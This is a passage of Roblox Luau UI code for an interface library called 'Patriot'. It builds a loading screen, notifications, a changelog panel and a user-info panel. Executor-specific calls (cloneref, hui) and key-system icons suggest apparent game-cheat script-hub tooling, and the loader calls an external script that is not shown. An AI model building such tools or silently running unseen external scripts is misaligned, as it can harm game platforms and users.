    local mobile = isMobile()

    local loadingScreen = Instance.new("Frame")
    loadingScreen.Size = UDim2.new(1, 0, 1, 0)
    loadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    loadingScreen.BackgroundTransparency = 1
    loadingScreen.BorderSizePixel = 0
    loadingScreen.Parent = gui

    local linesContainer = Instance.new("Frame")
    linesContainer.Size = UDim2.new(1, 0, 1, 0)
    linesContainer.BackgroundTransparency = 1
    linesContainer.Parent = loadingScreen

    local longLines = {}
    local linePositions = {0.15, 0.35, 0.65, 0.85}
    for i = 1, 4 do
        local line = Instance.new("Frame")
        line.Size = UDim2.new(0.3, 0, 0, mobile and 2 or 3)
        line.Position = UDim2.new(1.3, 0, linePositions[i], 0)
        line.BackgroundColor3 = getText()
        line.BackgroundTransparency = 1
        line.BorderSizePixel = 0
        line.Parent = linesContainer
        Instance.new("UICorner", line).CornerRadius = UDim.new(1, 0)
        longLines[i] = line
    end

    local shipSize = mobile and 18 or 28
    local shipContainer = Instance.new("Frame")
    shipContainer.Size = UDim2.new(0, mobile and 100 or 150, 0, mobile and 30 or 50)
    shipContainer.Position = UDim2.new(0.5, 0, 0.35, 0)
    shipContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    shipContainer.BackgroundTransparency = 1
    shipContainer.Parent = loadingScreen

    local shipBody = Instance.new("Frame")
    shipBody.Size = UDim2.new(0, shipSize, 0, shipSize)
    shipBody.Position = UDim2.new(0.5, 10, 0.5, 0)
    shipBody.AnchorPoint = Vector2.new(0.5, 0.5)
    shipBody.BackgroundColor3 = getText()
    shipBody.BackgroundTransparency = 1
    shipBody.BorderSizePixel = 0
    shipBody.Parent = shipContainer
    Instance.new("UICorner", shipBody).CornerRadius = UDim.new(1, 0)

    local pointSize = mobile and 10 or 16
    local shipPoint = Instance.new("Frame")
    shipPoint.Size = UDim2.new(0, pointSize, 0, pointSize)
    shipPoint.Position = UDim2.new(1, 2, 0.5, 0)
    shipPoint.AnchorPoint = Vector2.new(0, 0.5)
    shipPoint.BackgroundColor3 = getText()
    shipPoint.BackgroundTransparency = 1
    shipPoint.BorderSizePixel = 0
    shipPoint.Rotation = 45
    shipPoint.Parent = shipBody
    Instance.new("UICorner", shipPoint).CornerRadius = UDim.new(0, 3)

    local trails = {}
    local trailConfigs = {
        {y = 0.20, width = mobile and 45 or 70},
        {y = 0.38, width = mobile and 60 or 95},
        {y = 0.62, width = mobile and 55 or 85},
        {y = 0.80, width = mobile and 40 or 65}
    }
    for i, config in ipairs(trailConfigs) do
        local trail = Instance.new("Frame")
        trail.Size = UDim2.new(0, config.width, 0, mobile and 2 or 3)
        trail.Position = UDim2.new(0.5, -15, config.y, 0)
        trail.AnchorPoint = Vector2.new(1, 0.5)
        trail.BackgroundColor3 = getText()
        trail.BackgroundTransparency = 1
        trail.BorderSizePixel = 0
        trail.Parent = shipContainer
        local gradient = Instance.new("UIGradient", trail)
        gradient.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.3, 0.5), NumberSequenceKeypoint.new(1, 0)})
        Instance.new("UICorner", trail).CornerRadius = UDim.new(1, 0)
        trails[i] = {frame = trail, config = config}
    end

    local phasesContainer = Instance.new("Frame")
    phasesContainer.Size = UDim2.new(0, mobile and 200 or 280, 0, mobile and 150 or 180)
    phasesContainer.Position = UDim2.new(0.5, 0, 0.62, 0)
    phasesContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    phasesContainer.BackgroundTransparency = 1
    phasesContainer.Parent = loadingScreen

    local phasesLayout = Instance.new("UIListLayout", phasesContainer)
    phasesLayout.Padding = UDim.new(0, mobile and 8 or 12)
    phasesLayout.SortOrder = Enum.SortOrder.LayoutOrder
    phasesLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    phasesLayout.VerticalAlignment = Enum.VerticalAlignment.Center

    local phases = {}
    local phaseNames = {"Initializing", "Creating folders", "Downloading assets", "Preparing interface", "Ready"}
    local phaseTextSize = mobile and 14 or 18

    for i, name in ipairs(phaseNames) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, mobile and 22 or 28)
        row.BackgroundTransparency = 1
        row.LayoutOrder = i
        row.Parent = phasesContainer

        local indicator = Instance.new("TextLabel")
        indicator.Size = UDim2.new(0, mobile and 22 or 28, 0, mobile and 22 or 28)
        indicator.BackgroundTransparency = 1
        indicator.Text = "○"
        indicator.TextColor3 = getPending()
        indicator.TextSize = phaseTextSize
        indicator.Font = Enum.Font.ArimoBold
        indicator.TextTransparency = 1
        indicator.Parent = row

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, mobile and -28 or -35, 1, 0)
        label.Position = UDim2.new(0, mobile and 28 or 35, 0, 0)
        label.BackgroundTransparency = 1
        label.Text = name
        label.TextColor3 = getPending()
        label.TextSize = phaseTextSize
        label.Font = Enum.Font.ArimoBold
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextTransparency = 1
        label.Parent = row

        phases[i] = {indicator = indicator, label = label}
    end

    local animationRunning = true
    local currentPhase = 0
    local pulseThread = nil

    local function animateLongLines()
        local speeds = {0.8, 1.0, 0.7, 0.9}
        while animationRunning do
            for i, line in ipairs(longLines) do
                task.spawn(function()
                    line.Position = UDim2.new(1.3, 0, linePositions[i], 0)
                    line.BackgroundTransparency = 0.5
                    TweenService:Create(line, TweenInfo.new(speeds[i], Enum.EasingStyle.Linear), {Position = UDim2.new(-0.4, 0, linePositions[i], 0), BackgroundTransparency = 0.9}):Play()
                end)
            end
            task.wait(0.5)
        end
    end

    local function animateTrails()
        while animationRunning do
            for _, trail in ipairs(trails) do
                local newWidth = trail.config.width + math.random(-12, 12)
                TweenService:Create(trail.frame, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {Size = UDim2.new(0, newWidth, 0, mobile and 2 or 3), BackgroundTransparency = 0.1 + math.random() * 0.3}):Play()
            end
            task.wait(0.1)
        end
    end

    local function animateShipShake()
        while animationRunning do
            local shakeAmount = mobile and 2 or 3
            TweenService:Create(shipContainer, TweenInfo.new(0.04, Enum.EasingStyle.Linear), {Position = UDim2.new(0.5, math.random(-shakeAmount, shakeAmount), 0.35, math.random(-1, 1))}):Play()
            task.wait(0.04)
        end
    end

    local function setPhase(num)
        if pulseThread then task.cancel(pulseThread) pulseThread = nil end
        for i = 1, 5 do
            local p = phases[i]
            if i < num then
                p.indicator.Text = "●"
                TweenService:Create(p.indicator, TweenInfo.new(0.2), {TextColor3 = getSuccess(), TextTransparency = 0}):Play()
                TweenService:Create(p.label, TweenInfo.new(0.2), {TextColor3 = getSuccess()}):Play()
            elseif i == num then
                p.indicator.Text = "●"
                p.indicator.TextTransparency = 0
                TweenService:Create(p.indicator, TweenInfo.new(0.2), {TextColor3 = getAccent()}):Play()
                TweenService:Create(p.label, TweenInfo.new(0.2), {TextColor3 = getText()}):Play()
                currentPhase = num
                pulseThread = task.spawn(function()
                    while currentPhase == num do
                        TweenService:Create(p.indicator, TweenInfo.new(0.4), {TextTransparency = 0.5}):Play()
                        task.wait(0.4)
                        if currentPhase ~= num then break end
                        TweenService:Create(p.indicator, TweenInfo.new(0.4), {TextTransparency = 0}):Play()
                        task.wait(0.4)
                    end
                end)
            else
                p.indicator.Text = "○"
                p.indicator.TextColor3 = getPending()
                p.label.TextColor3 = getPending()
            end
        end
    end

    task.spawn(function()
        TweenService:Create(blurEffect, TweenInfo.new(0.6), {Size = 24}):Play()
        TweenService:Create(loadingScreen, TweenInfo.new(0.5), {BackgroundTransparency = 0.25}):Play()
        task.wait(0.3)
        TweenService:Create(shipBody, TweenInfo.new(0.4, Enum.EasingStyle.Back), {BackgroundTransparency = 0}):Play()
        TweenService:Create(shipPoint, TweenInfo.new(0.4, Enum.EasingStyle.Back), {BackgroundTransparency = 0}):Play()
        task.spawn(animateLongLines)
        task.spawn(animateTrails)
        task.spawn(animateShipShake)
        task.wait(0.2)
        for i = 1, 5 do
            task.delay((i-1)*0.08, function()
                TweenService:Create(phases[i].indicator, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
                TweenService:Create(phases[i].label, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
            end)
        end
        task.wait(0.5)
        setPhase(1)
        runExternalScript()
        task.wait(0.3)
        setPhase(2) ensureFolders() task.wait(0.25)
        setPhase(3)
        local iconNames = {"key", "shield", "check", "copy", "discord", "alert", "lock", "loading", "close", "changelog", "user", "clock", "cart"}
        if shouldDownloadLogo() then table.insert(iconNames, "logo") end
        for _, name in ipairs(iconNames) do downloadIcon(name) task.wait(0.06) end
        Internal.IconsLoaded = true
        setPhase(4) task.wait(0.25)
        setPhase(5) task.wait(0.5)
        animationRunning = false
        if pulseThread then task.cancel(pulseThread) end
        TweenService:Create(loadingScreen, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
        TweenService:Create(shipBody, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        TweenService:Create(shipPoint, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
        for _, trail in pairs(trails) do TweenService:Create(trail.frame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play() end
        for _, line in pairs(longLines) do TweenService:Create(line, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play() end
        for i = 1, 5 do
            TweenService:Create(phases[i].indicator, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
            TweenService:Create(phases[i].label, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
        end
        TweenService:Create(blurEffect, TweenInfo.new(0.3), {Size = 0}):Play()
        task.wait(0.5)
        gui:Destroy()
        blurEffect:Destroy()
        if onComplete then onComplete() end
        completed = true
    end)

    while not completed do task.wait(0.05) end
end

local function EnsureIconsReady(callback)
    if allIconsCached() then
        loadAllIconsFromCache()
        runExternalScript()
        if callback then callback() end
    else
        ShowLoadingScreen(callback)
    end
end

-- Notification System
function Patriot:Notify(title, message, duration, iconType)
    duration = duration or 5
    iconType = iconType or "info"
    local scale = getScale()
    local width = math.clamp(320 * scale, 260, 380)
    local height = math.clamp(80 * scale, 75, 105)

    local notifGui = Instance.new("ScreenGui")
    notifGui.ResetOnSpawn = false
    notifGui.DisplayOrder = 999999
    notifGui.Parent = hui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, width, 0, height)
    frame.Position = UDim2.new(1, width + 20, 1, -15)
    frame.AnchorPoint = Vector2.new(1, 1)
    frame.BackgroundColor3 = getHeader()
    frame.BackgroundTransparency = 0.9
    frame.BorderSizePixel = 0
    frame.Parent = notifGui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)

    local notifGradient = Instance.new("UIGradient", frame)
    notifGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1, 0.1)
    })

    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = getAccent()
    stroke.Thickness = 1
    stroke.Transparency = 0.5

    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(1, 0, 0, 2)
    progressBg.Position = UDim2.new(0, 0, 1, -2)
    progressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    progressBg.BorderSizePixel = 0
    progressBg.Parent = frame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = getAccent()
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBg

    local iconSize = height - 35
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, iconSize, 0, iconSize)
    icon.Position = UDim2.new(0, 14, 0.5, -2)
    icon.AnchorPoint = Vector2.new(0, 0.5)
    icon.BackgroundTransparency = 1
    icon.ScaleType = Enum.ScaleType.Fit
    icon.Parent = frame

    local iconMap = {
        success = {"check", getSuccess()}, error = {"alert", getError()},
        warning = {"alert", getWarning()}, shield = {"shield", getAccent()},
        info = {"shield", getAccent()}, key = {"key", getAccent()},
        copy = {"copy", getSuccess()}, discord = {"discord", getDiscord()},
        close = {"close", getError()}
    }

    if iconMap[iconType] then
        icon.Image = getIcon(iconMap[iconType][1])
        icon.ImageColor3 = iconMap[iconType][2]
    else
        icon.Image = getLogoIcon()
        icon.ImageColor3 = getText()
    end

    local textX = 14 + iconSize + 14
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -(textX + 14), 0, 24)
    titleLabel.Position = UDim2.new(0, textX, 0, 12)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.ArimoBold
    titleLabel.TextSize = math.clamp(15 * scale, 13, 18)
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.TextColor3 = getText()
    titleLabel.Text = title
    titleLabel.TextTruncate = Enum.TextTruncate.AtEnd
    titleLabel.Parent = frame

    local messageLabel = Instance.new("TextLabel")
    messageLabel.Size = UDim2.new(1, -(textX + 14), 0, 22)
    messageLabel.Position = UDim2.new(0, textX, 0, 38)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Font = Enum.Font.ArimoBold
    messageLabel.TextSize = math.clamp(13 * scale, 11, 15)
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextColor3 = getTextDim()
    messageLabel.Text = message
    messageLabel.TextTruncate = Enum.TextTruncate.AtEnd
    messageLabel.Parent = frame

    local id = tick() .. HttpService:GenerateGUID(false)
    table.insert(Internal.NotificationList, {id = id, frame = frame, gui = notifGui, height = height})

    local function restack()
        local yOffset = 0
        for i = #Internal.NotificationList, 1, -1 do
            local n = Internal.NotificationList[i]
            if n and n.frame and n.frame.Parent then
                TweenService:Create(n.frame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Position = UDim2.new(1, -15, 1, -15 - yOffset)}):Play()
                yOffset = yOffset + n.height + 12
            end
        end
    end

    TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quart), {Position = UDim2.new(1, -15, 1, -15)}):Play()
    task.wait(0.1)
    restack()

    local function dismiss()
        for i, n in ipairs(Internal.NotificationList) do
            if n.id == id then table.remove(Internal.NotificationList, i) break end
        end
        TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {Position = UDim2.new(1, width + 20, frame.Position.Y.Scale, frame.Position.Y.Offset)}):Play()
        task.wait(0.3)
        notifGui:Destroy()
        restack()
    end

    TweenService:Create(progressBar, TweenInfo.new(duration, Enum.EasingStyle.Linear), {Size = UDim2.new(0, 0, 1, 0)}):Play()
    task.delay(duration, dismiss)

    local clickBtn = Instance.new("TextButton")
    clickBtn.Size = UDim2.new(1, 0, 1, 0)
    clickBtn.BackgroundTransparency = 1
    clickBtn.Text = ""
    clickBtn.Parent = frame
    clickBtn.MouseButton1Click:Connect(dismiss)
end

-- Enhanced Changelog Panel
local function CreateChangelogPanel(parent, windowWidth, panelHeight, panelWidth, mainFrame, gap)
    panelWidth = panelWidth or 220
    local isOpen = false

    local panel = Instance.new("Frame")
    panel.Name = "ChangelogPanel"
    panel.Size = UDim2.new(0, 0, 0, panelHeight)
    panel.Position = UDim2.new(1, gap, 0, 0)
    panel.BackgroundColor3 = getBackground()
    panel.BackgroundTransparency = 0.9
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Parent = mainFrame
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)

    local panelGradient = Instance.new("UIGradient", panel)
    panelGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1, 0.1)
    })
    panelGradient.Rotation = 45

    local panelStroke = Instance.new("UIStroke", panel)
    panelStroke.Color = getAccent()
    panelStroke.Thickness = 1
    panelStroke.Transparency = 1

    local panelHeader = Instance.new("Frame")
    panelHeader.Size = UDim2.new(1, 0, 0, 50)
    panelHeader.BackgroundColor3 = getHeader()
    panelHeader.BackgroundTransparency = 0.85
    panelHeader.BorderSizePixel = 0
    panelHeader.Parent = panel
    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 8)

    local panelHeaderFix = Instance.new("Frame")
    panelHeaderFix.Size = UDim2.new(1, 0, 0, 8)
    panelHeaderFix.Position = UDim2.new(0, 0, 1, -8)
    panelHeaderFix.BackgroundColor3 = getHeader()
    panelHeaderFix.BackgroundTransparency = 0.85
    panelHeaderFix.BorderSizePixel = 0
    panelHeaderFix.Parent = panelHeader

    local panelHeaderLine = Instance.new("Frame")
    panelHeaderLine.Size = UDim2.new(1, 0, 0, 1)
    panelHeaderLine.Position = UDim2.new(0, 0, 1, 0)
    panelHeaderLine.BackgroundColor3 = getAccent()
    panelHeaderLine.BackgroundTransparency = 0.4
    panelHeaderLine.BorderSizePixel = 0
    panelHeaderLine.Parent = panelHeader

    local panelHeaderIcon = Instance.new("ImageLabel")
    panelHeaderIcon.Size = UDim2.new(0, 16, 0, 16)
    panelHeaderIcon.Position = UDim2.new(0, 12, 0.5, 0)
    panelHeaderIcon.AnchorPoint = Vector2.new(0, 0.5)
    panelHeaderIcon.BackgroundTransparency = 1
    panelHeaderIcon.Image = getIcon("changelog")
    panelHeaderIcon.ImageColor3 = getAccent()
    panelHeaderIcon.ScaleType = Enum.ScaleType.Fit
    panelHeaderIcon.Parent = panelHeader

    local panelTitle = Instance.new("TextLabel")
    panelTitle.Size = UDim2.new(1, -65, 1, 0)
    panelTitle.Position = UDim2.new(0, 34, 0, 0)
    panelTitle.BackgroundTransparency = 1
    panelTitle.Text = "Changelog"
    panelTitle.TextColor3 = getText()
    panelTitle.TextSize = 16
    panelTitle.Font = Enum.Font.ArimoBold
    panelTitle.TextXAlignment = Enum.TextXAlignment.Left
    panelTitle.Parent = panelHeader

    local panelClose = Instance.new("ImageButton")
    panelClose.Size = UDim2.new(0, 20, 0, 20)
    panelClose.Position = UDim2.new(1, -14, 0.5, 0)
    panelClose.AnchorPoint = Vector2.new(1, 0.5)
    panelClose.BackgroundTransparency = 1
    panelClose.Image = getIcon("close")
    panelClose.ImageColor3 = getTextDim()
    panelClose.ScaleType = Enum.ScaleType.Fit
    panelClose.Parent = panelHeader
    panelClose.MouseEnter:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = getError()}):Play() end)
    panelClose.MouseLeave:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, 0, 1, -55)
    scrollFrame.Position = UDim2.new(0, 0, 0, 55)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 4
    scrollFrame.ScrollBarImageColor3 = getAccent()
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
    scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scrollFrame.Parent = panel

    local scrollPadding = Instance.new("UIPadding", scrollFrame)
    scrollPadding.PaddingLeft = UDim.new(0, 10)
    scrollPadding.PaddingRight = UDim.new(0, 10)
    scrollPadding.PaddingTop = UDim.new(0, 5)
    scrollPadding.PaddingBottom = UDim.new(0, 5)

    local contentLayout = Instance.new("UIListLayout", scrollFrame)
    contentLayout.Padding = UDim.new(0, 10)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder

    for i, update in ipairs(Patriot.Changelog) do
        local entry = Instance.new("Frame")
        entry.Size = UDim2.new(1, 0, 0, 0)
        entry.AutomaticSize = Enum.AutomaticSize.Y
        entry.BackgroundTransparency = 1
        entry.LayoutOrder = i * 2
        entry.Parent = scrollFrame

        local entryLayout = Instance.new("UIListLayout", entry)
        entryLayout.Padding = UDim.new(0, 5)

        local versionLabel = Instance.new("TextLabel")
        versionLabel.Size = UDim2.new(1, 0, 0, 22)
        versionLabel.BackgroundTransparency = 1
        versionLabel.Text = update.Version .. "  •  " .. update.Date
        versionLabel.TextColor3 = getAccent()
        versionLabel.TextSize = 14
        versionLabel.Font = Enum.Font.ArimoBold
        versionLabel.TextXAlignment = Enum.TextXAlignment.Left
        versionLabel.LayoutOrder = 1
        versionLabel.Parent = entry

        for j, change in ipairs(update.Changes) do
            local changeLabel = Instance.new("TextLabel")
            changeLabel.Size = UDim2.new(1, 0, 0, 0)
            changeLabel.AutomaticSize = Enum.AutomaticSize.Y
            changeLabel.BackgroundTransparency = 1
            changeLabel.Text = "  •  " .. change
            changeLabel.TextColor3 = getTextDim()
            changeLabel.TextSize = 12
            changeLabel.Font = Enum.Font.ArimoBold
            changeLabel.TextXAlignment = Enum.TextXAlignment.Left
            changeLabel.TextWrapped = true
            changeLabel.LayoutOrder = j + 1
            changeLabel.Parent = entry
        end

        if i < #Patriot.Changelog then
            local divWrapper = Instance.new("Frame")
            divWrapper.Size = UDim2.new(1, 0, 0, 2)
            divWrapper.BackgroundTransparency = 1
            divWrapper.LayoutOrder = i * 2 + 1
            divWrapper.Parent = scrollFrame

            local div = Instance.new("Frame")
            div.Size = UDim2.new(1, 0, 0, 1)
            div.BackgroundColor3 = getDivider()
            div.BackgroundTransparency = 0.5
            div.BorderSizePixel = 0
            div.Parent = divWrapper
        end
    end

    createFlowingBorder(panel, 8, 1, 0.3)

    local function toggle(changelogIcon, container, currentContainerWidth)
        isOpen = not isOpen
        if isOpen then
            TweenService:Create(panelStroke, TweenInfo.new(0.2), {Transparency = 0.3}):Play()
            TweenService:Create(panel, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, panelWidth, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, currentContainerWidth + gap + panelWidth, 0, panelHeight)}):Play()
            if changelogIcon then TweenService:Create(changelogIcon, TweenInfo.new(0.3), {Rotation = 180}):Play() end
        else
            TweenService:Create(panelStroke, TweenInfo.new(0.2), {Transparency = 1}):Play()
            TweenService:Create(panel, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, panelHeight)}):Play()
            TweenService:Create(container, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, currentContainerWidth, 0, panelHeight)}):Play()
            if changelogIcon then TweenService:Create(changelogIcon, TweenInfo.new(0.3), {Rotation = 0}):Play() end
        end
    end

    panelClose.MouseButton1Click:Connect(function() if isOpen then toggle(nil, parent, windowWidth) end end)
    return panel, toggle, function() return isOpen end, panelWidth
end

-- Enhanced User Info Panel
local function CreateUserInfoPanel(parent, windowWidth, panelHeight, panelWidth, mainFrame, gap, startOpen)
    panelWidth = panelWidth or 180
    local isOpen = startOpen or false
    local isCompact = panelHeight < 300
    local avatarSize = isCompact and 42 or 55
    local fieldHeight = isCompact and 24 or 28
    local titleSize = isCompact and 8 or 9
    local valueSize = isCompact and 10 or 11
    local welcomeSize = isCompact and 11 or 12
    local spacing = isCompact and 3 or 5

    local panel = Instance.new("Frame")
    panel.Name = "UserInfoPanel"
    panel.Size = UDim2.new(0, isOpen and panelWidth or 0, 0, panelHeight)
    panel.Position = UDim2.new(0, -(gap), 0, 0)
    panel.AnchorPoint = Vector2.new(1, 0)
    panel.BackgroundColor3 = getBackground()
    panel.BackgroundTransparency = 0.9
    panel.BorderSizePixel = 0
    panel.ClipsDescendants = true
    panel.Parent = mainFrame
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 8)

    local panelGradient = Instance.new("UIGradient", panel)
    panelGradient.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.1),
        NumberSequenceKeypoint.new(0.5, 0),
        NumberSequenceKeypoint.new(1, 0.1)
    })
    panelGradient.Rotation = -45

    local panelStroke = Instance.new("UIStroke", panel)
    panelStroke.Color = getAccent()
    panelStroke.Thickness = 1
    panelStroke.Transparency = isOpen and 0.3 or 1

    local panelHeader = Instance.new("Frame")
    panelHeader.Size = UDim2.new(1, 0, 0, 50)
    panelHeader.BackgroundColor3 = getHeader()
    panelHeader.BackgroundTransparency = 0.85
    panelHeader.BorderSizePixel = 0
    panelHeader.Parent = panel
    Instance.new("UICorner", panelHeader).CornerRadius = UDim.new(0, 8)

    local panelHeaderFix = Instance.new("Frame")
    panelHeaderFix.Size = UDim2.new(1, 0, 0, 8)
    panelHeaderFix.Position = UDim2.new(0, 0, 1, -8)
    panelHeaderFix.BackgroundColor3 = getHeader()
    panelHeaderFix.BackgroundTransparency = 0.85
    panelHeaderFix.BorderSizePixel = 0
    panelHeaderFix.Parent = panelHeader

    local panelHeaderLine = Instance.new("Frame")
    panelHeaderLine.Size = UDim2.new(1, 0, 0, 1)
    panelHeaderLine.Position = UDim2.new(0, 0, 1, 0)
    panelHeaderLine.BackgroundColor3 = getAccent()
    panelHeaderLine.BackgroundTransparency = 0.4
    panelHeaderLine.BorderSizePixel = 0
    panelHeaderLine.Parent = panelHeader

    local panelHeaderIcon = Instance.new("ImageLabel")
    panelHeaderIcon.Size = UDim2.new(0, 16, 0, 16)
    panelHeaderIcon.Position = UDim2.new(0, 12, 0.5, 0)
    panelHeaderIcon.AnchorPoint = Vector2.new(0, 0.5)
    panelHeaderIcon.BackgroundTransparency = 1
    panelHeaderIcon.Image = getIcon("user")
    panelHeaderIcon.ImageColor3 = getAccent()
    panelHeaderIcon.ScaleType = Enum.ScaleType.Fit
    panelHeaderIcon.Parent = panelHeader

    local panelTitle = Instance.new("TextLabel")
    panelTitle.Size = UDim2.new(1, -65, 1, 0)
    panelTitle.Position = UDim2.new(0, 34, 0, 0)
    panelTitle.BackgroundTransparency = 1
    panelTitle.Text = "User Info"
    panelTitle.TextColor3 = getText()
    panelTitle.TextSize = 16
    panelTitle.Font = Enum.Font.ArimoBold
    panelTitle.TextXAlignment = Enum.TextXAlignment.Left
    panelTitle.Parent = panelHeader

    local panelClose = Instance.new("ImageButton")
    panelClose.Size = UDim2.new(0, 20, 0, 20)
    panelClose.Position = UDim2.new(1, -14, 0.5, 0)
    panelClose.AnchorPoint = Vector2.new(1, 0.5)
    panelClose.BackgroundTransparency = 1
    panelClose.Image = getIcon("close")
    panelClose.ImageColor3 = getTextDim()
    panelClose.ScaleType = Enum.ScaleType.Fit
    panelClose.Parent = panelHeader
    panelClose.MouseEnter:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = getError()}):Play() end)
    panelClose.MouseLeave:Connect(function() TweenService:Create(panelClose, TweenInfo.new(0.15), {ImageColor3 = getTextDim()}):Play() end)

    local contentFrame = Instance.new("Frame")
    contentFrame.Size = UDim2.new(1, 0, 1, -55)
    contentFrame.Position = UDim2.new(0, 0, 0, 55)
    contentFrame.BackgroundTransparency = 1
    contentFrame.Parent = panel

    local contentPadding = Instance.new("UIPadding", contentFrame)
    contentPadding.PaddingLeft = UDim.new(0, 8)
    contentPadding.PaddingRight = UDim.new(0, 8)

    local contentLayout = Instance.new("UIListLayout", contentFrame)
    contentLayout.Padding = UDim.new(0, spacing)
    contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
    contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    contentLayout.VerticalAlignment = Enum.VerticalAlignment.Center

    local player = cloneref(Players.LocalPlayer)

    local avatarWrapper = Instance.new("Frame")
    avatarWrapper.Size = UDim2.new(0, avatarSize + 6, 0, avatarSize + 6)
    avatarWrapper.BackgroundTransparency = 1
    avatarWrapper.LayoutOrder = 1
    avatarWrapper.Parent = contentFrame

    local avatarGlow = Instance.new("Frame")
    avatarGlow.Size = UDim2.new(1, 0, 1, 0)
    avatarGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
    avatarGlow.AnchorPoint = Vector2.new(0.5, 0.5)
    avatarGlow.BackgroundColor3 = getAccent()
    avatarGlow.BackgroundTransparency = 0.6
    avatarGlow.BorderSizePixel = 0
    avatarGlow.Parent = avatarWrapper
    Instance.new("UICorner", avatarGlow).CornerRadius = UDim.new(0, 6)

    local avatarGlowStroke = Instance.new("UIStroke", avatarGlow)
    avatarGlowStroke.Color = getAccent()
    avatarGlowStroke.Thickness = 1.5
    avatarGlowStroke.Transparency = 0.3

    local avatarContainer = Instance.new("Frame")
    avatarContainer.Size = UDim2.new(0, avatarSize, 0, avatarSize)
    avatarContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
    avatarContainer.AnchorPoint = Vector2.new(0.5, 0.5)
    avatarContainer.BackgroundColor3 = getInput()
    avatarContainer.BorderSizePixel = 0
    avatarContainer.ClipsDescendants = true
    avatarContainer.Parent = avatarWrapper
    Instance.new("UICorner", avatarContainer).CornerRadius = UDim.new(0, 6)

    local avatarImage = Instance.new("ImageLabel")
    avatarImage.Size = UDim2.new(1, 0, 1, 0)
    avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
    avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
    avatarImage.BackgroundTransparency = 1
    avatarImage.ScaleType = Enum.ScaleType.Crop
    avatarImage.Parent = avatarContainer
    pcall(function()
        local content = Players:GetUserThumbnailAsync(player and player.UserId or 0, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
        avatarImage.Image = content
    end)

    local welcomeLabel = Instance.new("TextLabel")
    welcomeLabel.Size = UDim2.new(1, 0, 0, isCompact and 14 or 18)
    welcomeLabel.BackgroundTransparency = 1
    welcomeLabel.Text = "Welcome, " .. (player and player.DisplayName or "User")
    welcomeLabel.TextColor3 = getText()
    welcomeLabel.TextSize = welcomeSize
    welcomeLabel.Font = Enum.Font.ArimoBold
    welcomeLabel.TextTruncate = Enum.TextTruncate.AtEnd
    welcomeLabel.LayoutOrder = 2
